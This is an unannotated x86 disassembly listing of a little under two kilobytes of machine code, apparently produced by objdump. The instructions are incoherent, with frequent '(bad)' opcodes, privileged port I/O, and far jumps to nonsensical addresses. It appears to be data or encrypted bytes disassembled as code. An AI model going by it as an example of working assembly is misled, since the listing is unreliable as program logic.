  41ae54:	mov    ebp,0x243c33cc
  41ae59:	adc    al,0xd0
  41ae5b:	mov    al,0x4f
  41ae5d:	inc    ecx
  41ae5e:	xor    eax,0xa4da0620
  41ae63:	std    
  41ae64:	cmp    ecx,ebx
  41ae66:	in     eax,0xa5
  41ae68:	dec    esi
  41ae69:	cmp    ebx,0x55
  41ae6c:	imul   esi,DWORD PTR [edi+0x5211b142],0x722547e0
  41ae76:	imul   ebp,DWORD PTR [ecx],0xffffffa0
  41ae79:	cwde   
  41ae7a:	pop    esi
  41ae7b:	cli    
  41ae7c:	or     bl,al
  41ae7e:	mov    esi,0x1b10b164
  41ae83:	rcr    BYTE PTR [edx+0x1559412a],1
  41ae89:	cmp    DWORD PTR [ebx-0x61ebdba0],0xffffff8a
  41ae90:	imul   edx,DWORD PTR [esi-0x10],0x6a0179e4
  41ae97:	inc    edx
  41ae98:	and    DWORD PTR [ecx+edx*4+0x0],0x3805f561
  41aea0:	xchg   esp,eax
  41aea1:	popa   
  41aea2:	push   ds
  41aea3:	sbb    bl,BYTE PTR [eax+0x8d23786]
  41aea9:	inc    eax
  41aeaa:	push   0x82fff93a
  41aeaf:	mov    ch,0x68
  41aeb1:	inc    ecx
  41aeb2:	dec    ecx
  41aeb3:	pusha  
  41aeb4:	push   0xfe81f622
  41aeb9:	test   BYTE PTR [edi-0x739f4e23],ch
  41aebf:	mov    BYTE PTR ds:[edx-0x39bf4e5],al
  41aec6:	mov    bl,0xf3
  41aec8:	mov    bh,BYTE PTR [ecx+eax*8-0x56188ad4]
  41aecf:	xor    al,0x3e
  41aed1:	daa    
  41aed2:	and    eax,0x9a283f89
  41aed7:	push   edi
  41aed8:	add    al,0xf9
  41aeda:	sbb    eax,0x85b1203b
  41aedf:	(bad)  
  41aee0:	sub    esp,DWORD PTR [esi+0x18]
  41aee3:	enter  0x5243,0xd0
  41aee7:	and    DWORD PTR [ebx],edx
  41aee9:	loopne 0x41aef1
  41aeeb:	lds    esi,FWORD PTR [ecx-0x2]
  41aeee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeef:	push   ebp
  41aef0:	cmp    dl,cl
  41aef2:	dec    ebp
  41aef3:	xor    DWORD PTR [eax],0x60
  41aef6:	push   esi
  41aef7:	dec    ebp
  41aef8:	lods   eax,DWORD PTR ds:[esi]
  41aef9:	dec    ebp
  41aefa:	or     edi,DWORD PTR [esi]
  41aefc:	sahf   
  41aefd:	pusha  
  41aefe:	mul    BYTE PTR [eax+0x2f]
  41af01:	inc    eax
  41af02:	inc    ecx
  41af03:	or     dl,BYTE PTR [ebx]
  41af05:	add    BYTE PTR [eax+0x73],al
  41af08:	test   al,0xe0
  41af0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af0b:	rcl    ebx,1
  41af0d:	inc    edx
  41af0e:	fwait
  41af0f:	mov    ds:0x360832ee,al
  41af14:	add    ch,ch
  41af16:	dec    edi
  41af17:	push   ebp
  41af18:	inc    eax
  41af19:	arpl   sp,si
  41af1b:	cs cmp al,0x17
  41af1e:	aad    0x1c
  41af20:	iret   
  41af21:	sub    al,0x39
  41af23:	push   ds
  41af24:	cmp    ch,BYTE PTR [eax-0x63]
  41af27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af28:	rcl    DWORD PTR [edx-0x7f],0x97
  41af2c:	push   ds
  41af2d:	jbe    0x41af82
  41af2f:	dec    ecx
  41af30:	xchg   ecx,eax
  41af31:	mov    edi,0xd66babbf
  41af36:	fiadd  WORD PTR [ebx+0x3867537f]
  41af3c:	sbb    esp,esp
  41af3e:	push   edx
  41af3f:	mov    bh,0xb5
  41af41:	pop    esp
  41af42:	nop
  41af43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af44:	cmp    al,0x53
  41af46:	mov    ecx,DWORD PTR [edx-0x35768188]
  41af4c:	mov    ?,WORD PTR [edx*4-0x473ee7da]
  41af53:	cmp    al,0x8
  41af55:	inc    esp
  41af56:	test   eax,0x6aae4057
  41af5b:	lods   al,BYTE PTR ds:[esi]
  41af5c:	adc    esp,esp
  41af5e:	sub    eax,0xc761590c
  41af63:	icebp  
  41af64:	and    ecx,DWORD PTR [ecx-0x5a]
  41af67:	jl     0x41af3d
  41af69:	icebp  
  41af6a:	dec    esp
  41af6b:	test   BYTE PTR [ebp*2+0x376dfd6a],0xf2
  41af73:	iretw  
  41af75:	cmp    DWORD PTR [ebp-0x779a8383],edx
  41af7b:	fstp   QWORD PTR [ecx]
  41af7d:	mov    esi,0x846222c6
  41af82:	aas    
  41af83:	jl     0x41afe2
  41af85:	sub    cl,BYTE PTR [edx-0x2b]
  41af88:	(bad)  
  41af89:	cwde   
  41af8a:	outs   dx,BYTE PTR ds:[esi]
  41af8b:	sbb    BYTE PTR [esi-0x56],dh
  41af8e:	mov    al,0x9
  41af90:	or     ah,BYTE PTR [edi+0x5c7590b7]
  41af96:	jbe    0x41afea
  41af98:	stc    
  41af99:	xor    BYTE PTR [edi],ah
  41af9b:	ins    BYTE PTR es:[edi],dx
  41af9c:	pop    ss
  41af9d:	or     ecx,DWORD PTR [esi+0x12]
  41afa0:	mov    WORD PTR [edx],?
  41afa2:	inc    ecx
  41afa3:	test   BYTE PTR [edi+0x50],cl
  41afa6:	xchg   ebp,eax
  41afa7:	(bad)  
  41afa8:	mov    edx,0x250fa746
  41afad:	xor    eax,esi
  41afaf:	or     esi,DWORD PTR [edx]
  41afb1:	push   es
  41afb2:	xlat   BYTE PTR ds:[ebx]
  41afb3:	sub    eax,0xb7bc9b1e
  41afb8:	or     cl,BYTE PTR [eax-0x16]
  41afbb:	retf   
  41afbc:	xchg   edi,eax
  41afbd:	jmp    0x41afa5
  41afbf:	sub    dh,BYTE PTR [eax]
  41afc1:	dec    ecx
  41afc2:	int    0x86
  41afc4:	pop    edi
  41afc5:	stc    
  41afc6:	imul   ebp,DWORD PTR [ebx],0x3c3e336c
  41afcc:	xchg   edi,eax
  41afcd:	pop    esi
  41afce:	and    al,0xf2
  41afd0:	xchg   edx,eax
  41afd1:	data16 loopne 0x41af8f
  41afd4:	jnp    0x41afbb
  41afd6:	mov    cs,WORD PTR [ebx-0x44]
  41afd9:	loopne 0x41b013
  41afdb:	icebp  
  41afdc:	jp     0x41b026
  41afde:	out    dx,al
  41afdf:	pop    ebx
  41afe0:	or     al,0xf5
  41afe2:	fwait
  41afe3:	bnd jne 0x41afa5
  41afe6:	rol    BYTE PTR [edi+esi*2],0xce
  41afea:	push   ds
  41afeb:	loop   0x41af90
  41afed:	icebp  
  41afee:	or     eax,esi
  41aff0:	jp     0x41b009
  41aff2:	and    eax,0x5481d67a
  41aff7:	xchg   BYTE PTR [edx],al
  41aff9:	(bad)  
  41affa:	xchg   ecx,eax
  41affb:	and    esi,0x2b
  41affe:	inc    ecx
  41afff:	fmul   QWORD PTR [edi+0x5a]
  41b002:	mov    eax,DWORD PTR [ecx-0x35dd560a]
  41b008:	pop    ds
  41b009:	out    dx,eax
  41b00a:	scas   al,BYTE PTR es:[edi]
  41b00b:	pop    ecx
  41b00c:	sub    bl,BYTE PTR [eax-0xa]
  41b00f:	cdq    
  41b010:	mov    ch,0x80
  41b012:	loop   0x41b008
  41b014:	sbb    DWORD PTR [esi],0xb23d12a9
  41b01a:	aas    
  41b01b:	(bad)  
  41b01c:	lods   al,BYTE PTR ds:[esi]
  41b01d:	pushf  
  41b01e:	call   0x58f743e1
  41b023:	ss inc ecx
  41b025:	push   esp
  41b026:	mov    ah,0x3d
  41b028:	scas   al,BYTE PTR es:[edi]
  41b029:	lods   al,BYTE PTR ds:[esi]
  41b02a:	sbb    eax,0xa086a40f
  41b02f:	sar    BYTE PTR [esi],1
  41b031:	xchg   esp,eax
  41b032:	jne    0x41afe5
  41b034:	mov    ebp,ss
  41b036:	xchg   DWORD PTR [eax],esp
  41b038:	jne    0x41afce
  41b03a:	int    0xdc
  41b03c:	and    al,0xa3
  41b03e:	jp     0x41b06e
  41b040:	dec    esi
  41b041:	push   0x59
  41b043:	mov    edi,0xf438d693
  41b048:	retf   
  41b049:	pushf  
  41b04a:	jo     0x41b0c3
  41b04c:	addr16 xchg esi,eax
  41b04e:	and    al,0x7e
  41b050:	ret    0x8704
  41b053:	idiv   edx
  41b055:	and    BYTE PTR ds:0xea451086,0xbc
  41b05c:	(bad)  
  41b05e:	fisttp QWORD PTR [ebx+0x6abe4a81]
  41b065:	mov    bh,0x61
  41b067:	jp     0x41b0bf
  41b069:	pop    ebp
  41b06a:	or     DWORD PTR [ebx-0x550e0e92],edi
  41b070:	mov    ah,0xbf
  41b072:	xor    eax,0x3929d839
  41b077:	sbb    BYTE PTR [ebp-0xe23ceff],bh
  41b07d:	test   al,0x35
  41b07f:	es pop ebx
  41b081:	sub    al,BYTE PTR [ebx-0x66]
  41b084:	dec    edi
  41b085:	popa   
  41b086:	and    cl,BYTE PTR [eax+0x40]
  41b089:	jp     0x41b0d4
  41b08b:	fcmovnbe st,st(0)
  41b08d:	sub    bl,BYTE PTR [edi]
  41b08f:	rcl    DWORD PTR [ecx+0x1e],1
  41b092:	sub    eax,0x19a4334a
  41b097:	int3   
  41b098:	xor    DWORD PTR [esi+edx*8],eax
  41b09b:	sbb    BYTE PTR [eax+0x40a47ef6],bh
  41b0a1:	sbb    DWORD PTR [edi],ebx
  41b0a3:	fimul  WORD PTR [ecx-0x28]
  41b0a6:	sbb    DWORD PTR [edx+esi*2],edx
  41b0a9:	push   cs
  41b0aa:	mov    ecx,0x6398f6ca
  41b0af:	adc    bh,BYTE PTR [ebx-0x79]
  41b0b2:	push   ss
  41b0b3:	mov    edi,0x2f42a490
  41b0b8:	xlat   BYTE PTR ds:[ebx]
  41b0b9:	sub    eax,0x54d54a10
  41b0be:	int3   
  41b0bf:	dec    edi
  41b0c0:	int3   
  41b0c1:	and    al,0xea
  41b0c3:	in     eax,dx
  41b0c4:	loop   0x41b0cf
  41b0c6:	jmp    0x6b3c:0x60d7098c
  41b0cd:	outs   dx,BYTE PTR ds:[esi]
  41b0ce:	push   edi
  41b0cf:	cmp    DWORD PTR [esi],0xf48f9d67
  41b0d5:	inc    ecx
  41b0d6:	mov    ebx,0xbfbf9854
  41b0db:	rol    DWORD PTR [edi-0x2b],0xd0
  41b0df:	xor    edi,esi
  41b0e1:	aaa    
  41b0e2:	adc    eax,0x31af4bbc
  41b0e7:	push   edx
  41b0e8:	aam    0xe5
  41b0ea:	adc    al,0xe4
  41b0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ed:	scas   eax,DWORD PTR es:[edi]
  41b0ee:	out    0xde,eax
  41b0f0:	(bad)  
  41b0f1:	retf   0x43e
  41b0f4:	(bad)  
  41b0f5:	es adc eax,0x4482dd74
  41b0fb:	push   eax
  41b0fc:	sbb    dh,BYTE PTR [ebx-0x8]
  41b0ff:	xchg   DWORD PTR [ebx-0x480d3b12],edx
  41b105:	cwde   
  41b106:	xchg   esp,eax
  41b107:	jmp    0x41b15a
  41b109:	rcl    esp,0xa3
  41b10c:	popa   
  41b10d:	xor    dl,0xf1
  41b110:	lea    edi,[edi+0x321cdc0f]
  41b116:	je     0x41b0d7
  41b118:	loop   0x41b184
  41b11a:	mov    eax,0x71f9ac9c
  41b11f:	inc    esp
  41b120:	fadd   st,st(2)
  41b122:	jo     0x41b108
  41b124:	leave  
  41b125:	ret    0x2a2e
  41b128:	sar    DWORD PTR [eax],0x62
  41b12b:	mov    cl,0x6c
  41b12d:	mul    BYTE PTR [edx*1-0x17536fe2]
  41b134:	ins    BYTE PTR es:[edi],dx
  41b135:	sbb    dl,al
  41b137:	mov    eax,0x35f0c8e8
  41b13c:	loope  0x41b10c
  41b13e:	sub    DWORD PTR [ebp+eiz*2-0x25c24dfb],edi
  41b145:	mov    eax,ds:0xfd7d2f14
  41b14a:	xor    eax,0xa846b15
  41b14f:	pop    eax
  41b150:	pop    ds
  41b151:	adc    esp,eax
  41b153:	out    0xef,al
  41b155:	fcmovnb st,st(1)
  41b157:	cli    
  41b158:	dec    ebx
  41b159:	adc    eax,0x2cfc3707
  41b15e:	push   eax
  41b15f:	into   
  41b160:	ins    DWORD PTR es:[edi],dx
  41b161:	es out dx,al
  41b163:	(bad)  
  41b165:	stos   BYTE PTR es:[edi],al
  41b166:	iret   
  41b167:	add    edx,ebp
  41b169:	sahf   
  41b16a:	mov    al,ds:0xba54891e
  41b16f:	add    esp,ebp
  41b171:	int3   
  41b172:	aad    0xc2
  41b174:	test   DWORD PTR [edx+0xc],ebx
  41b177:	les    ebx,FWORD PTR [ebx]
  41b179:	jge    0x41b157
  41b17b:	popa   
  41b17c:	xchg   edi,eax
  41b17d:	push   edi
  41b17e:	xor    BYTE PTR [edi-0xa],ch
  41b181:	push   edx
  41b182:	jp     0x41b1de
  41b184:	mov    ch,0x82
  41b186:	xlat   BYTE PTR ds:[ebx]
  41b187:	cmp    al,0xa6
  41b189:	imul   eax,DWORD PTR [eax+0x1e],0xaf3a468d
  41b190:	adc    dh,cl
  41b192:	sahf   
  41b193:	bound  ebp,QWORD PTR [edi-0x79]
  41b196:	scas   eax,DWORD PTR es:[edi]
  41b197:	push   edi
  41b198:	mov    eax,0x88c56d01
  41b19d:	xchg   ebx,eax
  41b19e:	pop    ecx
  41b19f:	mov    esi,0x9ffc6fb
  41b1a4:	ss js  0x41b19c
  41b1a7:	jp     0x41b142
  41b1a9:	jne    0x41b1dd
  41b1ab:	pop    ecx
  41b1ac:	and    DWORD PTR [eax-0x34],0xffffff8d
  41b1b0:	aad    0x40
  41b1b2:	mov    WORD PTR [edx+0x36],cs
  41b1b5:	cmp    eax,DWORD PTR [esi+ebp*4+0x6a]
  41b1b9:	add    eax,0x8a650d24
  41b1be:	mov    al,ds:0x193c5f65
  41b1c3:	xor    al,0xb3
  41b1c5:	sub    al,0xc2
  41b1c7:	popa   
  41b1c8:	test   DWORD PTR [edi],ebx
  41b1ca:	out    0xbf,al
  41b1cc:	mov    dl,0x3c
  41b1ce:	or     ch,BYTE PTR [esi]
  41b1d0:	mov    WORD PTR [edi-0x7e],?
  41b1d3:	and    eax,0x742e65a3
  41b1d8:	je     0x41b15e
  41b1da:	stc    
  41b1db:	mov    edx,DWORD PTR [edx+0x316da343]
  41b1e1:	jno    0x41b175
  41b1e3:	push   cs
  41b1e4:	pop    ecx
  41b1e5:	shr    eax,0xab
  41b1e8:	test   al,0x41
  41b1ea:	cmp    al,0xdf
  41b1ec:	popa   
  41b1ed:	lds    edi,FWORD PTR [ecx]
  41b1ef:	outs   dx,BYTE PTR ds:[esi]
  41b1f0:	xor    edx,ebx
  41b1f2:	(bad)  
  41b1f3:	cmc    
  41b1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1f5:	xchg   esi,eax
  41b1f6:	xchg   DWORD PTR [ebp-0x46ee2352],ebp
  41b1fc:	push   esp
  41b1fd:	out    0x42,al
  41b1ff:	and    al,0x11
  41b201:	mov    edx,0xb84701a4
  41b206:	js     0x41b280
  41b208:	jne    0x41b1b0
  41b20a:	mov    ah,0xc8
  41b20c:	arpl   dx,di
  41b20e:	ins    DWORD PTR es:[edi],dx
  41b20f:	push   ecx
  41b210:	push   esi
  41b211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b212:	add    DWORD PTR [edx-0x61dbe56b],esi
  41b218:	out    dx,eax
  41b219:	sbb    ebp,DWORD PTR [esi-0x57]
  41b21c:	out    0xd,al
  41b21e:	fiadd  DWORD PTR [ebx+eax*4-0x13c3cc26]
  41b225:	gs fldl2t 
  41b228:	adc    ebp,eax
  41b22a:	pusha  
  41b22b:	test   DWORD PTR [edx],ecx
  41b22d:	fst    QWORD PTR ds:0x7eaac9eb
  41b233:	and    bl,BYTE PTR [eax-0x7c]
  41b236:	and    al,0x81
  41b238:	xor    eax,0xdb77af4b
  41b23d:	mov    ds:0x3b67d1d,eax
  41b242:	pop    ebx
  41b243:	and    al,0x29
  41b245:	cmp    DWORD PTR ds:0x774729af,ebp
  41b24b:	push   ecx
  41b24c:	dec    ebx
  41b24d:	cmc    
  41b24e:	inc    esp
  41b24f:	aam    0x9
  41b251:	test   al,0x4f
  41b253:	jmp    0xb085:0xd1d30d37
  41b25a:	add    eax,0xbe52ea3e
  41b25f:	jbe    0x41b1e7
  41b261:	mov    eax,ds:0x9630c7fc
  41b266:	out    dx,al
  41b267:	test   eax,0x4bfd1045
  41b26c:	fmul   DWORD PTR [ebp+eiz*4-0x147c630e]
  41b273:	fisttp DWORD PTR [ecx+0x6b]
  41b276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b277:	sbb    al,0x5
  41b279:	arpl   WORD PTR [edx+0x2a6e4b8e],di
  41b27f:	mov    bl,dl
  41b281:	cdq    
  41b282:	(bad)  
  41b283:	fdivr  QWORD PTR [esi+0x740bf696]
  41b289:	fdiv   DWORD PTR [ebp-0x34dec0a0]
  41b28f:	mov    BYTE PTR [edx],0x99
  41b292:	and    al,0xfc
  41b294:	jg     0x41b28e
  41b296:	out    0x96,eax
  41b298:	mov    dh,BYTE PTR [ecx-0x49]
  41b29b:	test   eax,0x2180f0f8
  41b2a0:	cmp    DWORD PTR [edx-0x61],eax
  41b2a3:	imul   esp,ecx,0x9dc75fcb
  41b2a9:	call   0x9afd:0x3422b398
  41b2b0:	mov    ebp,0xc0eb9833
  41b2b5:	jmp    0x41b2b5
  41b2b7:	cli    
  41b2b8:	push   edx
  41b2b9:	sbb    BYTE PTR [esi+0x3cfecab4],ch
  41b2bf:	mov    dh,bh
  41b2c1:	jmp    0x464c:0x40ed2a13
  41b2c8:	jecxz  0x41b28b
  41b2ca:	or     ch,BYTE PTR [edi]
  41b2cc:	jb     0x41b29e
  41b2ce:	addr16 fs push esp
  41b2d1:	jecxz  0x41b350
  41b2d3:	clc    
  41b2d4:	outs   dx,DWORD PTR ds:[esi]
  41b2d5:	xchg   DWORD PTR [ecx-0x4b],edx
  41b2d8:	push   edi
  41b2d9:	ss mov esp,0x51ff7c61
  41b2df:	nop
  41b2e0:	or     al,0xf2
  41b2e2:	rcr    BYTE PTR [ebp-0x1d],cl
  41b2e5:	jbe    0x41b318
  41b2e7:	sar    eax,cl
  41b2e9:	nop
  41b2ea:	out    0x71,al
  41b2ec:	int3   
  41b2ed:	ss jno 0x41b2de
  41b2f0:	mov    ah,0x43
  41b2f2:	add    al,0x86
  41b2f4:	ret    
  41b2f5:	inc    eax
  41b2f6:	dec    ebp
  41b2f7:	mov    eax,ebx
  41b2f9:	mov    bl,0xc4
  41b2fb:	inc    ecx
  41b2fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2fd:	inc    edx
  41b2fe:	push   0xfffffffe
  41b300:	addr16 pop ecx
  41b302:	arpl   WORD PTR [esi+0x5],di
  41b305:	neg    DWORD PTR [eax+0x1aa6473c]
  41b30b:	cmp    al,0xfc
  41b30d:	gs xchg edx,eax
  41b30f:	xor    eax,0x2051ebb6
  41b314:	loop   0x41b2a8
  41b316:	in     al,dx
  41b317:	xor    dl,BYTE PTR [esi+eiz*8+0xa]
  41b31b:	mov    ecx,0xc9d4b49b
  41b320:	adc    ebx,DWORD PTR [ecx-0x34]
  41b323:	mov    ecx,0xea43177c
  41b328:	inc    ecx
  41b329:	enter  0xa160,0x37
  41b32d:	xchg   DWORD PTR [edi],esi
  41b32f:	cdq    
  41b330:	jmp    0xae68:0xd0daf544
  41b337:	mov    edx,0x86b36940
  41b33c:	jb     0x41b31a
  41b33e:	mov    eax,ds:0xaf845190
  41b343:	fbld   TBYTE PTR [edi-0x7dd690a1]
  41b349:	mov    ecx,0x9dea97ee
  41b34e:	cmp    eax,0x32672588
  41b353:	xchg   esp,eax
  41b354:	dec    ecx
  41b355:	iret   
  41b356:	inc    esi
  41b357:	fidiv  WORD PTR [eax+eax*2+0x576af0c4]
  41b35e:	inc    edi
  41b35f:	jae    0x41b3c4
  41b361:	stos   DWORD PTR es:[edi],eax
  41b362:	loopne 0x41b34b
  41b364:	hlt    
  41b365:	lods   al,BYTE PTR ds:[esi]
  41b366:	ficom  DWORD PTR [eax]
  41b368:	and    al,0x88
  41b36a:	pop    esi
  41b36b:	push   ss
  41b36c:	in     eax,0x62
  41b36e:	jmp    0x73ff43a5
  41b373:	xor    ecx,ecx
  41b375:	mov    esp,0xfd41725b
  41b37a:	mov    DWORD PTR [edx-0x4de55148],esp
  41b380:	xor    BYTE PTR [ebx-0x161a27a],0x11
  41b387:	jmp    0x35f80d79
  41b38c:	jmp    0x41b353
  41b38e:	out    0x1a,eax
  41b390:	ud2    
  41b392:	popf   
  41b393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b394:	ror    BYTE PTR [edi+0x5c],1
  41b397:	and    esp,ebx
  41b399:	outs   dx,DWORD PTR ds:[esi]
  41b39a:	mov    ch,0x69
  41b39c:	mov    DWORD PTR [ecx],ecx
  41b39e:	rcr    DWORD PTR [ebx-0xb],cl
  41b3a1:	inc    esp
  41b3a2:	adc    BYTE PTR [eax],al
  41b3a4:	retfw  0xb99a
  41b3a8:	and    BYTE PTR [ebx],dl
  41b3aa:	js     0x41b379
  41b3ac:	nop
  41b3ad:	sti    
  41b3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3af:	retf   0xd1db
  41b3b2:	lds    ecx,FWORD PTR gs:[ecx+0x32]
  41b3b6:	xor    BYTE PTR [ebx],dh
  41b3b8:	retf   
  41b3b9:	les    ebx,FWORD PTR [ecx-0x3acc318f]
  41b3bf:	je     0x41b3ba
  41b3c1:	rcl    BYTE PTR [edi-0x49f7be1f],0xbe
  41b3c8:	int    0x1c
  41b3ca:	imul   ecx,DWORD PTR [edi],0x51ccb3d2
  41b3d0:	test   al,0x27
  41b3d2:	jb     0x41b429
  41b3d4:	push   eax
  41b3d5:	sbb    DWORD PTR [esi+0x3d261b28],esp
  41b3db:	pop    ecx
  41b3dc:	pop    edx
  41b3dd:	scas   al,BYTE PTR es:[edi]
  41b3de:	push   edi
  41b3df:	mov    eax,ds:0x17105fdc
  41b3e4:	sub    eax,0x478045e8
  41b3e9:	fistp  WORD PTR [edi]
  41b3eb:	(bad)  
  41b3ec:	ins    BYTE PTR es:[edi],dx
  41b3ed:	arpl   WORD PTR [ecx],bp
  41b3ef:	pop    eax
  41b3f0:	inc    esi
  41b3f1:	cmp    eax,0x8edfcbd8
  41b3f6:	es into 
  41b3f8:	sar    cl,1
  41b3fa:	dec    eax
  41b3fb:	ins    DWORD PTR es:[edi],dx
  41b3fc:	js     0x41b401
  41b3fe:	(bad)  
  41b3ff:	adc    al,0xd1
  41b401:	pop    eax
  41b402:	inc    ebx
  41b403:	mov    edi,0x682a27a5
  41b408:	pop    es
  41b409:	adc    BYTE PTR [edx],bl
  41b40b:	lahf   
  41b40c:	xor    BYTE PTR [edx+0x31a7837c],al
  41b412:	int3   
  41b413:	(bad)  
  41b414:	std    
  41b415:	fstp   TBYTE PTR [ecx]
  41b417:	pusha  
  41b418:	(bad)  
  41b419:	loopne 0x41b3bb
  41b41b:	hlt    
  41b41c:	je     0x41b497
  41b41e:	jo     0x41b3ac
  41b420:	rcl    BYTE PTR [ebx-0x15],1
  41b423:	mov    cl,0xde
  41b425:	das    
  41b426:	pop    edi
  41b427:	lea    ebp,[edx-0x32]
  41b42a:	lock (bad) 
  41b42c:	gs cmp al,0xf5
  41b42f:	pusha  
  41b430:	aad    0xf4
  41b432:	sub    ah,BYTE PTR [edi]
  41b434:	neg    ch
  41b436:	xlat   BYTE PTR ds:[ebx]
  41b437:	sub    DWORD PTR [edx+0x43],edi
  41b43a:	rol    DWORD PTR [ecx+0x1577d9f5],1
  41b440:	out    0x5c,al
  41b442:	sub    eax,0xe1d4031c
  41b447:	iret   
  41b448:	call   0xa1088051
  41b44d:	jbe    0x41b466
  41b44f:	push   0xffffffa3
  41b451:	mov    ah,ah
  41b453:	loope  0x41b47c
  41b455:	push   eax
  41b457:	xor    ebx,DWORD PTR [ebx+0x63]
  41b45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b45b:	sti    
  41b45c:	popf   
  41b45d:	jb     0x41b439
  41b45f:	test   BYTE PTR [edx-0x29da0566],ah
  41b465:	or     cl,BYTE PTR [edi-0x743728e0]
  41b46b:	inc    esp
  41b46c:	and    DWORD PTR [edx-0x612a9167],0x9915c9c
  41b476:	dec    esp
  41b477:	jge    0x41b429
  41b479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b47a:	loope  0x41b468
  41b47c:	sbb    al,0xec
  41b47e:	pusha  
  41b47f:	ins    DWORD PTR es:[edi],dx
  41b480:	inc    ecx
  41b482:	and    dh,dh
  41b484:	sub    al,0x87
  41b486:	mov    edi,DWORD PTR [esi+edi*4+0x19c7c900]
  41b48d:	std    
  41b48e:	ds pop edi
  41b490:	retf   
  41b491:	loope  0x41b4a8
  41b493:	or     eax,0xb6060784
  41b498:	out    0xed,al
  41b49a:	jg     0x41b471
  41b49c:	mov    ch,dl
  41b49e:	add    BYTE PTR [ecx],dh
  41b4a0:	mov    cl,0x1e
  41b4a2:	out    dx,eax
  41b4a3:	mov    al,BYTE PTR [ecx]
  41b4a5:	pusha  
  41b4a6:	shl    ebx,0xaa
  41b4a9:	and    DWORD PTR [edi],0xffffffef
  41b4ac:	ja     0x41b529
  41b4ae:	pop    ebx
  41b4af:	inc    ebp
  41b4b0:	aad    0xad
  41b4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4b3:	shl    DWORD PTR [edi+ebp*8-0x2f],1
  41b4b7:	call   0x5426:0x179e901
  41b4be:	test   DWORD PTR [edi+eax*1-0x65],ebx
  41b4c2:	fnstcw WORD PTR [edi-0x72]
  41b4c5:	push   es
  41b4c6:	push   0xef45ad20
  41b4cb:	push   edx
  41b4cc:	fisubr WORD PTR [esi+esi*4]
  41b4cf:	sbb    BYTE PTR [eax-0x56],ch
  41b4d2:	add    al,0xf4
  41b4d4:	iret   
  41b4d5:	pop    ecx
  41b4d6:	adc    bl,BYTE PTR [ebx-0x2f438b72]
  41b4dc:	push   0x36b96baa
  41b4e1:	mov    al,ds:0xfb8a6dd5
  41b4e6:	retf   
  41b4e7:	out    0xf6,al
  41b4e9:	jmp    0x3fb6:0xc8e7d546
  41b4f0:	push   cs
  41b4f1:	loop   0x41b4f1
  41b4f3:	dec    ebx
  41b4f4:	sub    esp,edi
  41b4f6:	leave  
  41b4f7:	sub    dl,BYTE PTR [edi-0x33c1fa1d]
  41b4fd:	int3   
  41b4fe:	jb     0x41b537
  41b500:	mov    esp,0xd81ac249
  41b505:	call   0x7a3b0675
  41b50a:	push   ebp
  41b50b:	mov    edx,0x36a821e8
  41b510:	cs inc edi
  41b512:	xor    bh,BYTE PTR [ebx+ebp*4]
  41b515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b516:	repnz fs gs push 0x3b254c36
  41b51e:	sub    al,0x7f
  41b520:	mov    esi,0x6941f44d
  41b525:	cmp    BYTE PTR [ecx+0x5e],ch
  41b528:	call   0x201f909c
  41b52d:	or     edx,esi
  41b52f:	fdivr  QWORD PTR gs:[ebx]
  41b532:	xchg   ebp,esi
  41b534:	mov    ds:0x9459ccdf,eax
  41b539:	fst    st(7)
  41b53b:	inc    esp
  41b53c:	pop    eax
  41b53d:	fimul  WORD PTR [edi-0x33]
  41b540:	pop    esi
  41b541:	ret    0x4aba
  41b544:	jl     0x41b509
  41b546:	test   al,0xbf
  41b548:	inc    ecx
  41b549:	enter  0x9bcf,0x64
  41b54d:	ror    BYTE PTR [ebx],1
  41b54f:	je     0x41b5cc
  41b551:	mov    al,ds:0x27e84ba2
  41b556:	cld    
  41b557:	sbb    bh,0x2f
  41b55a:	jp     0x41b5db
  41b55c:	push   edi
  41b55d:	mov    ebp,0xe2c4ee80
  41b562:	popf   
  41b563:	lock sbb al,BYTE PTR [esi+ecx*8]
  41b567:	xchg   ecx,eax
  41b568:	add    bh,dl
  41b56a:	mov    ebx,0x177530e7
  41b56f:	pop    edx
  41b570:	cmp    BYTE PTR [ebx],bh
  41b572:	and    DWORD PTR [esi+0x6f],ebp
  41b575:	ss cmp edx,ebx
  41b578:	imul   ah
  41b57a:	cmp    edx,0x44
  41b57d:	fistp  QWORD PTR [ebx-0x22]
  41b580:	pushf  
  41b581:	dec    ecx
  41b582:	pop    DWORD PTR [edi]
  41b584:	push   ecx
  41b585:	in     eax,0xb3
  41b587:	int3   
  41b588:	int3   
  41b589:	lea    edi,[edx+0x7d]
  41b58c:	out    dx,eax
  41b58d:	pop    ebx
  41b58e:	mov    ebp,0xda86bd71
  41b593:	stos   BYTE PTR es:[edi],al
  41b594:	out    dx,eax
  41b595:	push   ebp
  41b596:	push   ebx
  41b597:	fcomp  st(2)
  41b599:	ins    DWORD PTR es:[edi],dx
  41b59a:	push   edi
  41b59b:	adc    bl,BYTE PTR [eax+0x6e]
  41b59e:	test   DWORD PTR [ebx-0x61b6b02c],edx
  41b5a4:	dec    ebp
  41b5a5:	jae    0x41b5db
  41b5a7:	inc    ebp
  41b5a8:	add    ebx,DWORD PTR ds:0xdc30d4ed
  41b5ae:	push   ds
  41b5af:	add    DWORD PTR [bp+si-0x1a],ecx
  41b5b3:	test   BYTE PTR [eax+0x16],ch
  41b5b6:	shl    DWORD PTR [edx],0x80
  41b5b9:	fidiv  DWORD PTR [esi]
  41b5bb:	frstor [ebx-0x39]
  41b5be:	arpl   WORD PTR [edx-0x20dd9312],di
  41b5c4:	loope  0x41b5fb
  41b5c6:	jg     0x41b566
  41b5c8:	ror    DWORD PTR [eax-0x71],0xa5
